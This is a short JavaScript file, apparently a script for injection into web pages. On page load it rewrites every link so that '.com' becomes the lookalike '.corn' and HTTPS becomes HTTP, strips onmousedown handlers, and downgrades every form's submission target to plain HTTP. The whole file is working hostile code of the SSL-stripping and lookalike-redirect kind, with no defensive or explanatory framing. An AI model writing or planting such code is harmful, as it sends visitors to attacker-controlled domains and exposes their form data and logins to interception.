function r() {
	var anchors = document.getElementsByTagName("a");
	var forms = document.getElementsByTagName("form");

	for (var i = 0; i < anchors.length; i++) {
		anchors[i].href = anchors[i].href.replace('.com', '.corn');
		anchors[i].href = anchors[i].href.replace('https://', 'http://');
		anchors[i].removeAttribute("onmousedown");
	}


	for (var i = 0; i < forms.length; i++) {
		forms[i].action = forms[i].action.replace('https://', 'http://');
	}

}
window.onload = r;

